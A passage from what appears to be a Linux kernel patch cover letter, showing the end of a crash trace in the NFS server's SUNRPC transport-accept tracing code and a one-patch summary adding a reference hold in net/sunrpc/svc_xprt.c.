+[  333.980242][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
+[  333.981476][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
+[  333.981879][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
+[  333.982391][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
+[  333.982899][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
+[  333.983401][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
+[  333.983948][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
+[  333.984458][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
+[  333.985059][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  333.985486][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
+[  333.986017][ T1246] PKRU: 55555554
+[  333.986254][ T1246] Call Trace:
+[  333.986469][ T1246]  <TASK>
+[  333.986668][ T1246]  do_trace_event_raw_event_svc_xprt_accept+0xce/0x5d0
+[  333.987112][ T1246]  ? __pfx_do_trace_event_raw_event_svc_xprt_accept+0x10/0x10
+[  333.987582][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  333.987949][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  333.988320][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  333.988686][ T1246]  ? kasan_quarantine_put+0xcc/0x1d0
+[  333.989350][ T1246]  svc_recv+0x1d74/0x2520
+[  333.989649][ T1246]  nfsd+0x2f1/0x440
+[  333.989900][ T1246]  ? __pfx_nfsd+0x10/0x10
+[  333.990185][ T1246]  kthread+0x2bd/0x3a0
+[  333.990451][ T1246]  ? __pfx_kthread+0x10/0x10
+[  333.990750][ T1246]  ? __pfx_kthread+0x10/0x10
+[  333.991046][ T1246]  ret_from_fork+0x31/0x70
+[  333.991329][ T1246]  ? __pfx_kthread+0x10/0x10
+[  333.991632][ T1246]  ret_from_fork_asm+0x1a/0x30
+[  333.991958][ T1246]  </TASK>
+[  333.992156][ T1246] Modules linked in:
+[  333.992461][ T1246] ---[ end trace 0000000000000000 ]---
+[  333.992828][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
+[  333.993321][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
+[  333.994585][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
+[  333.994975][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
+[  333.995510][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
+[  333.996041][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
+[  333.996546][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
+[  333.997104][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
+[  333.997621][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
+[  333.998216][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  333.998627][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
+[  333.999145][ T1246] PKRU: 55555554
+[  333.999377][ T1246] Kernel panic - not syncing: Fatal exception
+[  333.999901][ T1246] Kernel Offset: disabled
+[  334.000176][ T1246] Rebooting in 10 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  SUNRPC: hold a reference while tracing accepted transports
+
+ net/sunrpc/svc_xprt.c | 2 ++
+ 1 file changed, 2 insertions(+)
+
+-- 
+2.43.0
 
